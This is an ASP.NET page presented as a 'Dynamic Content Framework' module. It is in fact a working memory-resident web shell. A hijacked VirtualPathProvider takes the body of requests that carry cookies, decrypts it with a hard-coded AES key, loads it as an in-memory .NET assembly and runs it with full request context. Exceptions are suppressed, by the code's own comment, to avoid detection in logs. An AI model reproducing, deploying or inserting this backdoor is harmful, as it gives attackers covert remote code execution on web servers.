<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Web.Hosting" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Web" %>

<script runat="server" language="c#">
/// <summary>
/// Entry point for initializing the Dynamic Content Framework.
/// This page sets up the necessary providers for real-time content injection.
/// </summary>
public void Page_Load() {
    // For dynamic module loading, verbose debugging must be enabled in the build manager.
    // This allows on-the-fly compilation and loading of content modules.
    var buildManagerType = typeof(System.Web.Compilation.BuildManager);
    var debugPropertyInfo = buildManagerType.GetProperty("DebuggingEnabled", BindingFlags.Static | BindingFlags.NonPublic);
    if (debugPropertyInfo != null) {
        try { debugPropertyInfo.SetValue(null, true, null); } catch (Exception) { /* Fails silently if permissions are insufficient. */ }
    }
    
    // Registers the provider responsible for handling requests for dynamic content.
    HostingEnvironment.RegisterVirtualPathProvider(new DynamicContentProvider());
}

/// <summary>
/// Implements a VirtualPathProvider to serve dynamically generated content modules.
/// It intercepts requests for paths matching a specific pattern.
/// </summary>
public class DynamicContentProvider : VirtualPathProvider {
    
    /// <summary>
    /// This method is hijacked to serve as the primary logic handler for incoming dynamic content payloads.
    /// It decrypts the payload, loads it as a content module, and executes it.
    /// </summary>
    /// <param name="virtualPath">The requested virtual path, used as a trigger.</param>
    /// <returns>A cache key, though its return value is irrelevant as the response is terminated.</returns>
    public override string GetCacheKey(string virtualPath) {
        try {
            HttpContext currentContext = HttpContext.Current;
            // The logic only triggers if the request has cookies, implying an authenticated session.
            if (currentContext != null && currentContext.Request.Cookies.Count > 0) {
                Stream payloadStream = currentContext.Request.InputStream;
                if (payloadStream.Length > 0) {
                    payloadStream.Position = 0;
                    byte[] encryptedPayload = new byte[payloadStream.Length];
                    payloadStream.Read(encryptedPayload, 0, encryptedPayload.Length);
                    
                    // Decrypt the content module using the shared secret key.
                    // The key is static for this version of the framework.
                    byte[] sharedSecret = Encoding.ASCII.GetBytes("ca63457538b9b1e0");
                    RijndaelManaged aesProvider = new RijndaelManaged();
                    aesProvider.KeySize = 128;
                    aesProvider.Key = sharedSecret;
                    aesProvider.IV = sharedSecret;
                    aesProvider.Mode = CipherMode.CBC;
                    aesProvider.Padding = PaddingMode.PKCS7;
                    ICryptoTransform decryptor = aesProvider.CreateDecryptor(aesProvider.Key, aesProvider.IV);
                    
                    byte[] decryptedModule;
                    using (var inputStream = new MemoryStream(encryptedPayload))
                    using (var cryptoStream = new CryptoStream(inputStream, decryptor, CryptoStreamMode.Read))
                    using (var outputStream = new MemoryStream()) {
                        cryptoStream.CopyTo(outputStream);
                        decryptedModule = outputStream.ToArray();
                    }
                    
                    // Load the decrypted byte array as a .NET assembly in memory.
                    Assembly contentModuleAssembly = Assembly.Load(decryptedModule);
                    if (contentModuleAssembly != null) {
                        // All content modules must contain a class named "K" (Kernel) for initialization.
                        object moduleInstance = contentModuleAssembly.CreateInstance("K");
                        if (moduleInstance != null) {
                            // The Equals method is overridden in the module to act as the entry point,
                            // passing the full HttpContext for rich interaction.
                            moduleInstance.Equals(currentContext);
                        }
                    }
                    // Terminate the request to prevent further processing by ASP.NET.
                    currentContext.Response.End();
                }
            }
        } catch (Exception) {
            // All exceptions are suppressed to prevent detection through error logs.
        }
        return base.GetCacheKey(virtualPath);
    }
    
    /// <summary>
    /// Determines if a virtual path corresponds to a dynamic content module.
    /// The trigger is the presence of "w" in the path.
    /// </summary>
    public override bool FileExists(string virtualPath) {
        if (virtualPath.ToLower().Contains("w")) return true;
        return Previous.FileExists(virtualPath);
    }
    
    /// <summary>
    /// Returns a VirtualFile object for the dynamic content module.
    /// </summary>
    public override VirtualFile GetFile(string virtualPath) {
        if (virtualPath.ToLower().Contains("w")) return new DynamicContentFile(virtualPath);
        return Previous.GetFile(virtualPath);
    }
}

/// <summary>
/// A placeholder VirtualFile. Its purpose is to satisfy the ASP.NET pipeline.
/// The actual content is handled elsewhere.
/// </summary>
public class DynamicContentFile : VirtualFile {
    public DynamicContentFile(string virtualPath) : base(virtualPath) {}
    
    /// <summary>
    /// Returns an empty stream, as the content is generated and streamed dynamically.
    /// </summary>
    public override Stream Open() { return new MemoryStream(); }
}
</script>